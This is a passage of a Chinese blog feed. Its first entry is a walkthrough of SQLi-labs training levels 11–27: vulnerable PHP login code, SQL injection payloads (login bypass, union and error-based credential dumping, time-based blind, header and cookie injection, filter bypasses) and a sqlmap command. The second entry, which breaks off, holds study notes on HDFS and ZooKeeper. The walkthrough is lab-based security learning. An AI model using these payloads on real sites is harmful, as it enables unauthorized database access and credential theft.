class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POST注入由 <code>&#39;</code> 引起,注入语句由post提交</p><ul><li><p>万能登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=admin<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1<span class="string">&#x27; #&amp;passwd=1</span></span><br></pre></td></tr></table></figure></li><li><p>判断数列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=admin<span class="string">&#x27; order by 2 #&amp;passwd=1</span></span><br></pre></td></tr></table></figure></li><li><p>猜解库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=-admin<span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata)##&amp;passwd=1 </span></span><br></pre></td></tr></table></figure></li><li><p>后面依次猜解</p></li></ul><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>和less-11一样只是闭合符号换成 <code>&quot;)</code></p><ul><li>猜解库名<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=-admin<span class="string">&quot;) union select 1,(select group_concat(schema_name) from information_schema.schemata)##&amp;passwd=1 </span></span><br></pre></td></tr></table></figure></li></ul><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">       <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">       <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>由 <code>&#39;)</code> 引起的注入,错误有回显,正确无回显</p><ul><li>payload <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=1<span class="string">&#x27;) and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#&amp;passwd=1</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>源码 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>与less-13一致,闭合符号换成<code>&quot;</code></p><p>-payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=1<span class="string">&quot; and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#&amp;passwd=1</span></span><br></pre></td></tr></table></figure><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>基于时间的POST盲注,无回显 由<code>&#39;</code>引起</p><ul><li><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=1<span class="string">&#x27; or if(length(database())= 8,sleep(3),null) #&amp;passwd=1</span></span><br></pre></td></tr></table></figure></li><li><p>依次猜解</p></li></ul><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>与less-15一致,闭合符号换成 <code>&quot;)</code></p><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                <span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$update</span>);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>update报错注入,对passwd参数注入</p><ul><li><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=admin &amp; passwd=123<span class="string">&#x27; or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) #</span></span><br></pre></td></tr></table></figure></li><li><p>sqlmap注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/sqlilabs2/Less-17/&quot;</span> --data <span class="string">&quot;uname=admin&amp;passwd=woshiadmin&amp;submit=Submit&quot;</span> -p passwd --dbms mysql --threads 10 --method POST --flush-session --fresh-queries --level 1 --risk 1 --technique E --dbs</span><br></pre></td></tr></table></figure><ul><li>data:指定请求信息</li><li>p:指定参数</li><li>dbms:指定后端数据库</li><li>threads:指定并发线程数</li><li>method:指定请求方式</li><li>flush-session:清除session</li><li>fresh-queries:发起新的请求</li><li>level 1:尝试POST和GET注入</li><li>risk 1:仅测试常见用例</li><li>technique E:仅测试报错注入方式</li></ul></li></ul><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row1</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br></pre></td></tr></table></figure><p>抓包对ua进行注入</p><ul><li>payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0)<span class="string">&#x27; and (updatexml(1,concat(0x7e,user(),0x7e),1)) and &#x27;</span>1<span class="string">&#x27; = &#x27;</span>1</span><br></pre></td></tr></table></figure></li></ul><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>对Referer进行注入,参数一致</p><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>对cookie进行注入,参数一致</p><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>对cookie进行注入,需要用base64编码对注入cookie编码</p><ul><li>payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="built_in">uname</span>=YWRtaW4nIGFuZCAodXBkYXRleG1sKDEsY29uY2F0KDB4N2UsdXNlcigpLDB4N2UpLDEpKSBhbmQgJzEnID0gJzE=%3d</span><br></pre></td></tr></table></figure></li></ul><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>同上闭合为 <code>&quot;</code></p><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>注释符被过滤</p><ul><li>payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,(select group_concat(username,password ) from users),3  or  &#x27;</span>1<span class="string">&#x27; = &#x27;</span>1</span><br></pre></td></tr></table></figure></li></ul><h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>二次注入<br>在插入username的就直接把注入的payload插到数据库里，取出来时候造成注入<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151353507.png?token=ARYCSAQA54RALIR36KQEMBLCQCK3I"></p><p>登录了admin’ or 1&#x3D;1#这个账号 输入新密码admin<br>update的时候就把原先的admin’ or 1&#x3D;1 #取出来拿到语句中了,所以密码都是admin了。</p><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p>绕过系列</p><p>双写绕过</p><ul><li>payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; anandd 1=1 --+</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,database(),3 --+</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h2><p>没有单引号闭合</p><ul><li>payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1 anandd 1=1 --+</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,database() ,3--+</span><br></pre></td></tr></table></figure></li></ul><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p>单引号闭合 过滤了 or，and ， &#x2F;* , – , # , 空格 , &#x2F;</p><ul><li>payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;%26%26extractvalue(null,concat(0x7e,(select(group_concat(username,&#x27;</span>~<span class="string">&#x27;,passwoorrd))from(security.users)),0x7e))oorr&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><p>加了个)闭合</p><ul><li>payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1111<span class="string">&#x27;)union%A0select(1),(select(group_concat(id,&#x27;</span>~<span class="string">&#x27;,username,&#x27;</span>~<span class="string">&#x27;,passwoorrd))from(security.users)),3%7c%7c(&#x27;</span>1</span><br></pre></td></tr></table></figure></li></ul><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>在上关的基础上过滤了union和select</p><ul><li>payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;%09and%09updatexml(1,concat(0x7e,(SeleCt(group_concat(username,password))from(users)),0x7e),1)and&#x27;</span>1</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sql注入&quot;&gt;&lt;a href=&quot;#sql注入&quot; class=&quot;headerlink&quot; title=&quot;sql注入&quot;&gt;&lt;/a&gt;sql注入&lt;/h1&gt;&lt;p&gt;SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）&lt;/p&gt;
&lt;h2 id=&quot;常见的注入点&quot;&gt;&lt;a href=&quot;#常见的注入点&quot; class=&quot;headerlink&quot; title=&quot;常见的注入点&quot;&gt;&lt;/a&gt;常见的注入点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;GET&amp;#x2F;POST&amp;#x2F;PUT&amp;#x2F;DELETE参数&lt;/li&gt;
&lt;li&gt;X-Forwarded-For&lt;/li&gt;
&lt;li&gt;文件名&lt;/li&gt;
&lt;li&gt;4.1.2.2. Fuzz注入点&lt;/li&gt;
&lt;li&gt;‘ &amp;#x2F; “&lt;/li&gt;
&lt;li&gt;1&amp;#x2F;1&lt;/li&gt;
&lt;li&gt;1&amp;#x2F;0&lt;/li&gt;
&lt;li&gt;and 1&amp;#x3D;1&lt;/li&gt;
&lt;li&gt;“ and “1”&amp;#x3D;”1&lt;/li&gt;
&lt;li&gt;and 1&amp;#x3D;2 &lt;/li&gt;
&lt;li&gt;or 1&amp;#x3D;1&lt;/li&gt;
&lt;li&gt;or 1&amp;#x3D;&lt;/li&gt;
&lt;li&gt;‘ and ‘1’&amp;#x3D;’1&lt;/li&gt;
&lt;li&gt;+ - ^ * % &amp;#x2F;&lt;/li&gt;
&lt;li&gt;&amp;lt;&amp;lt; &amp;gt;&amp;gt; || | &amp;amp; &amp;amp;&amp;amp;&lt;/li&gt;
&lt;li&gt;~&lt;/li&gt;
&lt;li&gt;!&lt;/li&gt;
&lt;li&gt;@&lt;/li&gt;
&lt;li&gt;反引号执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;4-1-2-3-测试用常量&quot;&gt;&lt;a href=&quot;#4-1-2-3-测试用常量&quot; class=&quot;headerlink&quot; title=&quot;4.1.2.3. 测试用常量&quot;&gt;&lt;/a&gt;4.1.2.3. 测试用常量&lt;/h2&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="靶场" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>华为HCIA</title>
    <link href="http://example.com/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/"/>
    <id>http://example.com/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/</id>
    <published>2022-04-20T06:28:15.000Z</published>
    <updated>2022-05-15T06:37:20.204Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大数据概述-amp-解决办法"><a href="#大数据概述-amp-解决办法" class="headerlink" title="大数据概述&amp;解决办法"></a>大数据概述&amp;解决办法</h1><h2 id="大数据的特征（5v-1c）"><a href="#大数据的特征（5v-1c）" class="headerlink" title="大数据的特征（5v+1c）"></a>大数据的特征（5v+1c）</h2><ul><li>大量：数据量巨大，MB,GB,TB,PB</li><li>多样：数据类型多样，数据来源多样 数据来源：服务器日志、网站浏览信息、社交<br>结构化数据：表格数据 平台、摄像头信息<br>半结构化数据：网页html、xml<br>非结构化数据：视频、音频、图片、文字</li><li>高速：数据产生速度快、数据处理速度快</li><li>价值：价值密度低</li><li>准确：数据真实性</li><li>复杂：数据产生速度快、数据的类型多样等特征，导致做数据处理时处理过程变得很复杂</li></ul><h2 id="大数据处理流程"><a href="#大数据处理流程" class="headerlink" title="大数据处理流程"></a>大数据处理流程</h2><p>数据采集-&gt;数据预处理-&gt;数据存储-&gt;分析挖掘-&gt;数据可视化</p><h3 id="大数据任务类型"><a href="#大数据任务类型" class="headerlink" title="大数据任务类型"></a>大数据任务类型</h3><ul><li>IO密集型任务：大量输入输出请求的任务IO资源</li><li>计算密集型任务：有大量的计算要求，CPU资源</li><li>数据密集型任务：数据处理，并发数据处理</li></ul><h2 id="大数据的计算类型（数据处理类型）"><a href="#大数据的计算类型（数据处理类型）" class="headerlink" title="大数据的计算类型（数据处理类型）"></a>大数据的计算类型（数据处理类型）</h2><ul><li>批处理：一次处理一批量数据，处理的数据量大，但是延迟性高</li><li>流处理：一次处理一条数据，处理的数据量小，但是延迟性低</li><li>图处理：以图的形式展示数据，进行处理</li><li>查询分析计算：检索功能</li></ul><h2 id="大数据解决方案"><a href="#大数据解决方案" class="headerlink" title="大数据解决方案"></a>大数据解决方案</h2><p>Fusioninsight HD:部署在x86架构上<br>BigData pro:部署在ARM架构上<br>MapReduce Server（MRS）:部署华为云服务上</p><ul><li>高性能：支持自我研发的存储系统CarbonData</li><li>易运维：提供了可视化的管理界面</li><li>高安全：使用Kerborse &amp; Ldap实现认证管理和权限管理</li><li>低成本：按需购买，自定义配置底层架构性能</li></ul><h1 id="HDFS分布式文件系统"><a href="#HDFS分布式文件系统" class="headerlink" title="HDFS分布式文件系统"></a>HDFS分布式文件系统</h1><h2 id="HDFS-Hadoop分布式文件系统"><a href="#HDFS-Hadoop分布式文件系统" class="headerlink" title="HDFS (Hadoop分布式文件系统)"></a>HDFS (Hadoop分布式文件系统)</h2><ul><li>创建人:道格卡廷</li><li>起始原因:开发一个搜索引擎–&gt;存储问题(大量数据的存储)</li><li>google论文: GFS - google自身的分布式文件系统 <code>闭源</code></li></ul><h2 id="HDFS特性"><a href="#HDFS特性" class="headerlink" title="HDFS特性"></a>HDFS特性</h2><p>理论上HDFS存储可以无限扩展</p><ul><li>分布式:把多节点的存储系统结合为一一个整体对外提供服务(提高存储能力)</li><li>容错性:针对每个数据存储备份(默认3份)，备份存储分别存在不同的位置，如果备份或者数据有丢失，会再进行备份，保持一直都是3份</li><li>按块存储:块大小默认128M, 一个文件可以存储在多个块,<code>但是一个块只存储一个文件</code> <br><code>好处:数据丢失针对丢失的数据所属的块，只恢复当前块就可以</code></li><li>元数据:记录文件存储在哪些块,块存储在哪里等信息 <br>每个块都有一个元数据信息，并且元数据的大小是固定的150K</li></ul><h2 id="HDFS适用场景"><a href="#HDFS适用场景" class="headerlink" title="HDFS适用场景"></a>HDFS适用场景</h2><ul><li>可以做大文件</li><li>可以协助离线处理或批处理</li><li>流式数据访问机制</li></ul><h2 id="HDFS不适合做什么"><a href="#HDFS不适合做什么" class="headerlink" title="HDFS不适合做什么"></a>HDFS不适合做什么</h2><ul><li>不适合大量小文件存储</li><li>不适合做实时场景</li><li>不适合随机读写，可以做追加写</li></ul><h2 id="HDFS为什么不适合大量小文件存储"><a href="#HDFS为什么不适合大量小文件存储" class="headerlink" title="HDFS为什么不适合大量小文件存储"></a><code>HDFS为什么不适合大量小文件存储</code></h2><pre><code>(例: 10个文件，每个文件大小为20M)</code></pre><ol><li>10个文件需要使用10个块，并且每个块只是用了20M空间—&gt; 存储空间浪费</li><li>有10个元数据，元数据150K</li><li>寻址时间增长</li></ol><p>不适合随机读写，可以做追加写</p><h2 id="HDFS系统架构"><a href="#HDFS系统架构" class="headerlink" title="HDFS系统架构"></a>HDFS系统架构</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151412876.png?token=ARYCSARTUOKY4IGIGBRS7KTCQCM62"></p><ul><li>Client (客户端) :用户接口，用户通过Client连接到组件</li><li>NameNode (名称节点，主节点) :管理DataNode,并且接收用户请求,分发任务，存储元数据信息</li><li>DataNode (数据节点，从节点) :实际处理用户请求，维护自己的Block和实际存储位置映射关系</li><li>Block (块) : 数据存储</li></ul><h2 id="HDFS单NameNode的问题"><a href="#HDFS单NameNode的问题" class="headerlink" title="HDFS单NameNode的问题"></a>HDFS单NameNode的问题</h2><ul><li>单名称节点故障:整个集群都无法使用—&gt;HA(主备配置)</li><li>单名称节点性能瓶颈问题:并发处理的任务量有限—-&gt;联邦机制</li></ul><h2 id="HDFS-HA特性-主备配置"><a href="#HDFS-HA特性-主备配置" class="headerlink" title="HDFS HA特性(主备配置)"></a>HDFS HA特性(主备配置)</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151412014.png?token=ARYCSAW7AVKCAPDCYNNV5YLCQCM74"></p><ul><li>active节点:对外提供服务</li><li>standby节点:不断备份active节点的数据，<code>当active宕机,standby会成为新的active</code></li><li>zookeeper监测主节点的状态，一旦发现故障，zookeeper就通知备用节点成为新的主节点</li></ul><h2 id="HDFS的联邦机制"><a href="#HDFS的联邦机制" class="headerlink" title="HDFS的联邦机制"></a>HDFS的联邦机制</h2><pre><code>各个NN之间是相互隔离的，维护自己的命名空间</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151412309.png?token=ARYCSAUWS6RZPANWYMQDOCLCQCNAU"></p><h2 id="HDFS元数据持久化-主备同步"><a href="#HDFS元数据持久化-主备同步" class="headerlink" title="HDFS元数据持久化(主备同步)"></a>HDFS元数据持久化(主备同步)</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151412204.png?token=ARYCSAVN7VZ2UZ6V7RVJRITCQCNBS"></p><ol><li>备节点会通知主节点新建一个Editlog.new文件， 从这之后的操作都记录在.new文件中</li><li>备节点从主节点拷贝Editlog、Fsimage文件(只有第一 次需要 下载Fsimage,后续同步使用本地的)</li><li>将两个文件进行合并，生成Fsimage.ckpt文件</li><li>备节点将Fsimage.ckpt上传到主节点上</li><li>主节点接收到Fsimage.ckpt恢复成Fsimage</li><li>把Editlog.new重命名Editlog</li></ol><h2 id="HDFS副本机制-3份"><a href="#HDFS副本机制-3份" class="headerlink" title="HDFS副本机制 (3份)"></a>HDFS副本机制 (3份)</h2><ul><li>存储副本规则:</li></ul><ol><li>第一份副本存放在同一节点中(传输最快,但是如果节点故障，副本也会丢失)</li><li>第二份副本存放在同一机架的不同节点上(如果整个机架故障，副本也会丢失)</li><li>第三分副本存放在不同机架的其他节点上</li></ol><ul><li>副本距离公式:<code>优先选择的是距离小的</code></li></ul><ol><li>同节点的距离为0</li><li>同一机架不同节点的距离为2</li><li>不同机架的节点距离为4</li></ol><h2 id="HDFS读取流程"><a href="#HDFS读取流程" class="headerlink" title="HDFS读取流程"></a>HDFS读取流程</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151413392.png?token=ARYCSAQS3MNXYXLIKXZRAT3CQCNFE"></p><ol><li>Client向NameNode发起读取请求</li><li>NameNode接收到请求，反馈对应的元数据信息给Client</li><li>Client接收到反馈请求对应的DataNode <code>(如果Client本地有数据，优先从本地读取)</code></li><li>DataNode接收到请求，反馈数据内容给Client</li><li>关闭读取流</li></ol><h2 id="HDFS写入流程"><a href="#HDFS写入流程" class="headerlink" title="HDFS写入流程"></a>HDFS写入流程</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151413093.png?token=ARYCSASXKVI2WMTKAJWTIR3CQCNF2"></p><ol><li>Client向NameNode发出写入请求</li><li>NameNode接收到请求后生成该文件的元数据信息，反馈DataNode信息给Client</li><li>Client接收到DataNode信息之后，请求相对应的DataNode</li><li>Client提交文件写入到对应的DataNode</li><li>DataNode接收到写入请求，执行写入</li><li>Client写入第一-个节点后，由第一个节点写入第二个节点，第二个节点写入第三个节点</li><li>写入完成后反馈元数据信息给Client</li><li>关闭读取流，NameNode更新元数据信息</li></ol><h1 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h1><pre><code>分布式服务应用，可以帮助其他分布式组件协调管理集群</code></pre><h2 id="ZooKeeper的特性"><a href="#ZooKeeper的特性" class="headerlink" title="ZooKeeper的特性"></a>ZooKeeper的特性</h2><ul><li>分布式服务, ZooKeeper集群中有一半以上的节点存活集群才能正常运行</li><li>最终一致性:所有的节点对外提供的是同一个视图</li><li>实时性:实时获取、实时反馈应用状态</li><li>可靠性: 一条数据被-个节点接收到，就会被其他节点也接收</li><li>等待无关性:慢的或者失效的client请求，不会影响到其他客户端请求</li><li>原子性:最终状态只有成功或者失败</li></ul><h2 id="ZooKeeper集群主从选举-x2F-主备切换"><a href="#ZooKeeper集群主从选举-x2F-主备切换" class="headerlink" title="ZooKeeper集群主从选举&#x2F;主备切换"></a>ZooKeeper集群主从选举&#x2F;主备切换</h2><ul><li>选举: zookeeper内部投票选举,当节点得到一半以上的票数,它就会称为Leader,其他的节点都是Follower</li><li>主备切换:当leader出现故障,从其他的follower中重新选举新的leader</li></ul><h2 id="ZooKeeper的容灾能力"><a href="#ZooKeeper的容灾能力" class="headerlink" title="ZooKeeper的容灾能力"></a>ZooKeeper的容灾能力</h2><pre><code>(可容灾集群最低要求是3个节点)</code></pre><ul><li>在集群运行过程中允许发生故障的节点数(最大:节点数-半-1)</li><li>如:集群只要1个节点，容灾能力为0<br>  集群只要2个节点，容灾能力为0<br>  集群只要3个节点，容灾能力为1<br>  集群只要4个节点，容灾能力为1</li><li>搭建集群时，尽量选择奇数台节点进行搭建</li></ul><h2 id="ZooKeeper的读特性"><a href="#ZooKeeper的读特性" class="headerlink" title="ZooKeeper的读特性"></a>ZooKeeper的读特性</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151414245.png?token=ARYCSAUWFL3VQLC74QPFOFTCQCNHA"></p><ol><li>Client发起读取请求</li><li>获取到数据(不管接收请求的是Leader节点还是Follower节点)</li></ol><h2 id="ZooKeeper的写特性"><a 